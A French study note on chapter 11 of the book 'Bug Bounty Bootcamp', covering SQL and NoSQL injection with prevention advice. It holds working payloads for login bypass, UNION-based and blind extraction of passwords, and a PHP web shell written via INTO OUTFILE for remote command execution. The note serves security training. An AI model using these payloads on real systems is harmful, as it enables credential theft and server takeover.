[⬅ Retour à Bug Bounty Bootcamp](../01_The_Industry/00_General.md)

# Chapitre 11 — SQL Injection

> **Source :** Bug Bounty Bootcamp — Chapitre 11 · **Type :** note-chapitre  
> `#bug-bounty` `#cybersécurité` `#sql-injection` `#web-hacking` `#owasp-top10` `#nosql`

## Résumé

En déclin (les frameworks modernes protègent nativement) mais toujours critique quand trouvé — souvent parmi les payouts les plus élevés. Survient quand l'input utilisateur est concaténé directement dans une requête SQL sans neutraliser les caractères spéciaux du langage.

## Concepts clés

### Mécanisme de base — bypass d'authentification

Requête voulue :

```sql
SELECT Id FROM Users WHERE Username='vickie' AND Password='password123';
```

Injection dans le champ `username` : `admin';--`

```sql
SELECT Id FROM Users WHERE Username='admin';-- ' AND Password='password123';
```

`--` démarre un commentaire SQL → tout ce qui suit est ignoré → connexion en tant qu'`admin` sans connaître le mot de passe.

### SQL Injection basée sur UNION

Combine les résultats d'une 2e requête `SELECT` avec la requête légitime :

```sql
SELECT Title, Body FROM Emails WHERE Username='vickie' AND AccessKey='xxx'
UNION SELECT Username, Password FROM Users;--
```

→ Les identifiants de tous les utilisateurs apparaissent mélangés aux emails dans la réponse HTTP. ⚠️ Le nombre de colonnes des deux `SELECT` doit correspondre.

Fonctionne aussi sur `UPDATE`/`DELETE`/`INSERT` :

```sql
-- injection dans new_password : "password12345';--"
UPDATE Users SET Password='password12345';-- WHERE Id = 2;
```

→ le `WHERE` est commenté → **tous** les mots de passe changent.

### SQL Injection de second ordre

L'input est stocké (ex: au signup) puis réutilisé sans échappement **plus tard**, dans un contexte différent. Le payload passe la validation à l'enregistrement mais s'exécute lors d'une requête ultérieure qui réutilise cette donnée comme "sûre" (ex: username malveillant réinjecté dans une requête `/emails`).

### Prévention (donc obstacle à contourner)

- **Requêtes préparées / paramétrées** — le vrai remède : la requête est compilée _avant_ l'insertion des paramètres, donc l'input utilisateur ne peut jamais altérer la logique SQL
    
    ```php
    $stmt = $mysqli->prepare("SELECT Id FROM Users WHERE Username=? AND Password=?");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    ```
    
- **Allowlist** pour les valeurs non paramétrables par nature (ex: nom de colonne dans `ORDER BY`)
- Échappement/sanitization — imparfait, facile d'oublier un caractère spécial

### Méthodologie de chasse

Test universel : injecter un simple `'` dans chaque champ et observer une erreur ou une anomalie de comportement.

**1. Classique** (résultat visible directement) :

- **UNION-based** — voir ci-dessus
- **Error-based** — provoquer une erreur qui fuite de l'info via son message :
    
    ```sql
    UNION SELECT 1, CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);--
    ```
    
    → l'erreur de conversion peut afficher le mot de passe en clair dans le message

**2. Blind SQLi** (aucun résultat direct — inférence) :

- **Boolean-based** — un signal visuel (bannière "premium", page différente) confirme vrai/faux :
    
    ```sql
    2' UNION SELECT Id FROM Users WHERE Username='admin' AND SUBSTR(Password,1,1)='a';--
    ```
    
    → on brute-force caractère par caractère
- **Time-based** — utile si aucun signal visuel n'existe :
    
    ```sql
    UNION SELECT IF(SUBSTR(Password,1,1)='a', SLEEP(10), 0) FROM Users WHERE Username='admin';
    ```
    
    → un délai de 10s confirme la condition

**3. Exfiltration hors bande** (aucun retour direct ni observable) — écrire le résultat dans un fichier accessible via le webroot :

```sql
SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt'
```

→ puis lire `https://cible.example/output.txt`

**4. NoSQL Injection** (MongoDB et al.) — la syntaxe change mais le principe reste :

```
Users.find({username: 'admin', password: {$ne: ""}});
```

→ `$ne: ""` (opérateur "différent de") passe si le mot de passe admin n'est pas vide → bypass d'authentification. Les opérateurs `$where`, `mapReduce`, `$accumulator`, `$function` permettent parfois d'exécuter du JS arbitraire côté serveur (jusqu'au DoS via boucle infinie).

### Escalade

- **Cartographier la base** avant d'exploiter à fond :
    
    ```sql
    UNION SELECT 1, @@version;--                                            -- version (MySQL/MSSQL)UNION SELECT 1, table_name FROM information_schema.tables               -- lister les tablesUNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='Users'
    ```
    
- **Web shell** — écrire un fichier PHP exécutable via `INTO OUTFILE` :
    
    ```sql
    UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
    ```
    
    → `https://cible.example/shell.php?cmd=whoami` = RCE complet

### Automatisation

- **sqlmap** — outil de référence pour détecter et exploiter automatiquement (extension Burp : SQLiPy)

## Liens

- [Bug Bounty Bootcamp](../01_The_Industry/00_General.md)
- [Chapitre 10](10_Insecure_Direct_Object_References_%28IDOR%29.md)
- SQL Injection aveugle
- NoSQL Injection
- Remote Code Execution (RCE)
